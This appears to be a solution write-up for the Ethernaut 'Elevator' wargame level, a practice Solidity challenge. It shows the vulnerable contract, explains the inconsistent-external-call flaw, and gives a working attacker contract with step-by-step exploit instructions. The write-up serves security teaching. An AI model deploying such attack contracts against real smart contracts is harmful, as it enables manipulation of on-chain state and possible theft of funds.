Contract code: 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
**Vulnerability:** The contract is vulnerable to state manipulation due to the incorrect assumption that external function calls will return consistent results. In Solidity, 
when a contract calls an external function multiple times, it cannot assume the results will be the same for identical inputs. The Elevator contract calls building.isLastFloor() twice, once in the conditional check and once to set the top variable without caching the result. A malicious contract can implement isLastFloor() with internal state that changes between calls,
returning false the first time to pass the condition and true the second time to set top to true. This allows the attacker to manipulate the contract's state and bypass the intended logic.

## Exploit Steps

1. Deploy a custom smart contract that implements the isLastFloor() function with a counter to track how many times it has been called:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    uint public counter = 0;

    function isLastFloor(uint) external returns (bool) {
        counter++;
        if (counter == 1) {
            return false;  // First call - return false
        } else {
            return true;   // Second call - return true
        }
    }

    function attack(address _elevator) external {
        Elevator(_elevator).goTo(1);
    }
}
```

2. Call the attack() function, passing the address of the Elevator contract instance.

3. Induce State Manipulation: When the Elevator contract calls isLastFloor() the first time in the if condition, your contract returns false (counter = 1), allowing the condition to pass and floor to be updated. When Elevator calls isLastFloor() the second time to set top, your contract returns true (counter = 2), setting top = true.

    Verify the State: Confirm that top is now true by calling top() on the Elevator contract. The level is complete.

